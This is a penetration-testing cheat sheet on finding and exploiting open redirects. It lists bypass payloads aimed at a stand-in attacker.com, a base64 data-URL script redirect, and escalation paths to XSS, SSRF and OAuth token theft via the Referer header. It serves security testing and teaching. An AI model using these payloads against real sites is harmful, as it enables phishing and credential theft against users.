# Detection
- Look for redirect parameters (`redirect`, `redir`, `RelayState`, `next`, `u`, `n`, `forward`) in Burp HTTP history.
  ```bash
  https://example.com/login?redirect=https://example.com/dashboard    # absolute URL
  https://example.com/login?next=/dashboard                           # relative URL
  https://example.com/login?next=dashboard                            # relative URL without /
  ```
- Use Google Dorks to find additional redirect parameters
  ```bash
  inurl:"%3Dhttp" | inurl:"%3D%2F" | inurl:redir | inurl:redirect | inurl:redirecturi | inurl:redirect_uri | inurl:redirecturl | inurl:redirect_uri | inurl:return | inurl:returnurl | inurl:relaystate | inurl:forward | inurl:forwardurl | inurl:forward_url | inurl:url | inurl:uri | inurl:dest | inurl:destination | inurl:next site:example.com
  ```
- Test for parameter-based Open Redirects
  ```bash
  https://example.com/login?n=http://google.com       # random hostname
  https://example.com/login?n=http://attacker.com     # hostname you own
  ```

# Bypass
- Browsers redirect users to the location indicated by the `hostname` section of the URL.
  ```bash
  scheme://userinfo@hostname:port/path?query#fragment
  ```
- URL validator checks if the redirect URL **starts with**/**contains**/**ends with** the site’s domain name.
  - Add `a` in each part of redirection value, to findout which part is filtered  →  *redir=`a`http://`a`target`a`.`a`tld`a`/`a`param`a`*
  ```bash
  # ends with
  redir=https://attacker.com/?url=http://target.tld           # URL-parameter
  redir=https://attacker.com/target.tld
  
  # starts with
  redir=https://target.tld@attacker.com                       # Username portion of URL
  redir=https://target.tld@attacker.com/target.tld
  redir=https://target.tld%40attacker.com
  redir=https://target.tld.attacker.com                       # Subdomain
  redir=https://target.tld.attacker.com/target.tld
  
  # contains
  redir=https://attackertarget.tld                            # New domain
  ```
- Use path normalization (`/../`) to go to another path
  ```bash
  redir=http://open-door.local:900/hi/../level1/?url=https://google.com/?url=http://open-door.local
  ```
- Use capital leters to bypass some regex:
  ```bash
  rredir=http://open-door.local:900/hi/../Level1/?url=https://google.com/?url=http://open-door.local
  ```
- Using browser autocorrect
  ```bash
  redir=https:attacker.com                      # https:// or http:// are blacklisted
  redir=https;attacker.com
  redir=https:\/\/attacker.com
  redir=https:/\/\attacker.com
  redir=https://attacker.com\@example.com       # correction of \ to /
  redir=https://google。com                     # Non-ASCII dot 。 or %E3%80%82
  ```
- Using Data URLs
  - Data URLs use the `data:` scheme to embed small files in a URL. (`data:MEDIA_TYPE[;base64],DATA`)
    ```bash
    data:text/plain,hello!                   # Send a plaintext message with the data scheme
    data:text/plain;base64,aGVsbG8h          # Using the optional base64 specification in the preceding message
    ```
  - Redirect to attacker.com with `<script>location="https://attacker.com"</script>`
    ```bash
    https://target.tld/login?redir=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9hdHRhY2tlci5jb20iPC9zY3JpcHQ+
    ```
- Exploiting URL Decoding
  - Double (or triple) URL-Encoding
    ```bash
    https://target.tld%2f@attacker.com
    https://target.tld%252f@attacker.com
    https://target.tld%25252f@attacker.com
    ```
  - Non-ASCII Characters
    ```bash
    https://attacker.com%ff.target.tld         # ÿ
    https://attacker.com%E2%95%B1.target.tld   # ╱ (it is not slash /)
    ```
- Combining Exploit Techniques
  ```
  https://target.tld%252f@attacker.com/target.tld
  ```
  
# Escalate
- Escalate redirection to XSS  →  `...#javascript:alert(origin)`
- It redirects an unsuspecting victim from a legitimate domain to an attacker's phishing site (Low severity)
- Bypass SSRF domain whitelist to achieve full-blown SSRF.
- Induce an Open Redirect to steal the credentials/OAuth-tokens via the referer header, as when a page redirects to another site, browsers will include the originating URL as a referer HTTP request header.

# REcollapse
- https://github.com/0xacb/recollapse
- Black-box regex fuzzing to bypass validations and discover normalizations.
- Find out which locations in the parameter string we are able to change.
  ```bash
  recollapse http://open-door.local:900/
  ```

# Methodology
- Website  →  FLinks  →  HTTPx  →  Nuclei
  ```bash
  python3 flinks.py -i assets -o flinks-out
  cat flinks-out | httpx -silent | tee assets-httpx -fc 404,403,301,500 | nuclei -t open-redirect.yaml
  ```

# Tip
- In most sites, the redirect won’t happen until after a user action, like registration, login, or logout. In those cases, be sure to carry out the required user interactions before checking for the redirect
- Fuzz to discover hidden parameters
  - If the endpoint does not have parameter, try to fuzz (for example `/logout`)
  - If the endpoint has parameter, try to add new parameters to the query string
- In a **Register** page, we should discover hidden parameters, then
  - Reflect  →  XSS
  - HTTP request  →  SSRF
  - Redirect  →  Open Redirect 
- Some pages (like `login/logout`, `register`, `change site language`, `links in email`) automatically redirect users, even though they don’t contain redirect parameters in their URLs.
    - These pages are candidates for referer-based open redirects.
    - Search for 3XX response codes like 301 and 302 that indicate a redirect.
    - Test for referer-based open redirects on any page that redirect users despite not containing a redirect URL parameter, by set up a page on a domain you own and host this HTML page. Then click the link and see if you get redirected to your site automatically or after the required user interactions.
      ```bash
      <html>
         <a href="https://example.com/login">Click on this link!</a>
      </html>
      ```
      
# Resource
- https://book.hacktricks.xyz/pentesting-web/open-redirect
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
